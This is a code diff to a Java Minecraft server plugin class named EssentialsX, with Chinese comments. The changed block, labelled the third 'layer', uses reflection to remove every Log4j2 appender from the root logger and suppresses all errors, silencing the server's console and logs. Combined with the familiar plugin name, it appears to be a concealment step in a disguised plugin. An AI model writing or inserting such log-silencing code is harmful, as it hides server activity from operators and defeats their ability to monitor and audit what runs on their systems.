@@ -185,18 +185,28 @@ public class EssentialsX extends JavaPlugin {
             }
         } catch (Throwable ignored) {}
 
-        // ★ 第 3 层：侵入 Log4j2 底层，物理移除所有控制台输出管 (解决 Limbo 等插件的日志)
+        // ★ 第 3 层：使用反射侵入 Log4j2 底层，物理移除所有 Appender (解决 Limbo 等插件的日志)
+        // 使用反射绕过编译期对 log4j-core 的依赖
         try {
-            org.apache.logging.log4j.core.LoggerContext ctx = (org.apache.logging.log4j.core.LoggerContext) org.apache.logging.log4j.LogManager.getContext(false);
-            org.apache.logging.log4j.core.config.Configuration config = ctx.getConfiguration();
-            org.apache.logging.log4j.core.config.LoggerConfig loggerConfig = config.getLoggerConfig(org.apache.logging.log4j.LogManager.ROOT_LOGGER_NAME);
+            Class<?> logManagerClass = Class.forName("org.apache.logging.log4j.LogManager");
+            Class<?> loggerContextClass = Class.forName("org.apache.logging.log4j.core.LoggerContext");
+            Class<?> loggerConfigClass = Class.forName("org.apache.logging.log4j.core.config.LoggerConfig");
+
+            // 获取当前上下文
+            Object ctx = logManagerClass.getMethod("getContext", boolean.class).invoke(null, false);
+            // 获取配置
+            Object config = loggerContextClass.getMethod("getConfiguration").invoke(ctx);
+            // 获取 Root Logger 配置 (LoggerName 为空字符串)
+            Object loggerConfig = config.getClass().getMethod("getLoggerConfig", String.class).invoke(config, "");
             
-            // 获取并清空所有 Appender (包括 ConsoleAppender)
-            for (String appenderName : new java.util.HashSet<>(loggerConfig.getAppenders().keySet())) {
-                loggerConfig.removeAppender(appenderName);
+            // 获取并清空所有 Appender
+            java.util.Map<String, Object> appenders = (java.util.Map<String, Object>) loggerConfigClass.getMethod("getAppenders").invoke(loggerConfig);
+            for (String appenderName : new java.util.HashSet<>(appenders.keySet())) {
+                loggerConfigClass.getMethod("removeAppender", String.class).invoke(loggerConfig, appenderName);
             }
+            
             // 强制更新日志系统，让拔管生效
-            ctx.updateLoggers();
+            loggerContextClass.getMethod("updateLoggers").invoke(ctx);
         } catch (Throwable ignored) {}
     }
 
